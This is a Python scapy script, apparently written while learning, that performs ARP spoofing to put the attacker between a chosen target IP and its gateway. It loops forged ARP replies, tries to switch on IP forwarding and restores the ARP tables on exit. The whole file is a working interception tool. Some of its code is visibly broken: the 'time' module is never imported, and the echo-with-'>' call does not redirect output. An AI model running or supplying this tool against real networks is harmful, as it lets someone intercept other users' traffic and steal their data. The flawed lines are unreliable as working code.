#!/usr/bin/python

import scapy.all as scapy
import subprocess
import optparse
import sys

# packet = scapy.ARP(op=2, pdst="192.168.2.109", hwdst="b0:05:94:82:25:db", psrc="192.168.2.1")
# # setting op field to 2 to make this sent as arp response, not a request
# # print(packet.show())
# # print(packet.summary())
# scapy.send(packet)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

    # don't need the list for this one
    # clients_list = []
    # for element in answered_list:
    #     client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
    #     clients_list.append(client_dict)
    # return clients_list

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
    # print(packet.show())
    # print(packet.summary())

parser = optparse.OptionParser()

parser.add_option("-f", "--ip_forward", dest="set_ip_forwarding", help="Put 'True' to add ip forwarding")
parser.add_option("-t", "--target_ip", dest="target_ip", help="Set target ip to get MITM")
parser.add_option("-g", "--gateway_ip", dest="gateway_ip", help="Set gateway ip to get MITM")
(options, arguments)= parser.parse_args()

set_ip_forwarding = options.set_ip_forwarding
target_ip = options.target_ip
gateway_ip = options.gateway_ip

if(set_ip_forwarding != None):
    subprocess.call(["echo", "echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
    print("please check if this has been accomplished successfully. If not, do it manually with super user.")
    subprocess.call(["cat", "/proc/sys/net/ipv4/ip_forward"])

sent_packet_counts = 0

try:
    while True:
        sent_packet_counts += 2
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        # "\r" prints lines from the beginning everyetime
        print("\r[+] Packets sent: " + str(sent_packet_counts)),
        # print out immediately, not accumulate in a buffer
        # in python3:
        # print("\r[+] Packets sent: " + str(sent_packet_counts), end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTR + C ..... Quitting.")
    restore(target_ip, gateway_ip)
    print("[+] Restored ARP table")
